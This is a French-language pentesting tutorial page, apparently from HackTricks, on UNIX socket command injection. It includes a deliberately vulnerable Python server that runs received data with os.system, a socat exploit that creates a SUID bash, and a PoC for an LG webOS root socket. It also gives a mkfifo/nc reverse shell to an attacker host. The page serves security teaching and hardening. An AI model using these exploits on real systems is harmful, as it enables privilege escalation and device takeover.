# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

Dans l'exemple suivant, un **unix socket est créé** (`/tmp/socket_test.s`) et tout ce qui est **reçu** sera **exécuté** par `os.system`. Je sais que vous n'allez pas trouver cela dans la nature, mais l'objectif de cet exemple est de voir à quoi ressemble un code utilisant des unix sockets, et comment gérer l'entrée dans le pire des cas possible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Exécutez** le code avec python: `python s.py` et **vérifiez comment le socket est à l'écoute**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Étude de cas : élévation déclenchée par signal via un UNIX socket possédé par root (LG webOS)

Certains daemons privilégiés exposent un UNIX socket possédé par root qui accepte des entrées non fiables et associe des actions privilégiées à des IDs de thread natifs et à des signaux. Si le protocole permet à un client non privilégié d'influencer quel thread natif est ciblé, il est possible de déclencher un chemin de code privilégié et d'obtenir une élévation.

Schéma observé :
- Se connecter à un socket possédé par root (par ex., /tmp/remotelogger).
- Créer un thread et obtenir son identifiant de thread natif (TID).
- Envoyer le TID (packé) plus du padding en tant que requête ; recevoir un accusé de réception.
- Envoyer un signal spécifique à ce TID pour déclencher le comportement privilégié.

Esquisse de PoC minimale:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Pour transformer ceci en root shell, on peut utiliser un simple schéma named-pipe + nc :
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Remarques:
- Cette classe de bugs provient de la confiance accordée à des valeurs dérivées de l'état client non privilégié (TIDs) et de leur liaison à des gestionnaires de signaux ou à une logique privilégiée.
- Durcir en imposant des credentials sur le socket, en validant les formats de message, et en découplant les opérations privilégiées des identifiants de thread fournis par l'extérieur.

## Références

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
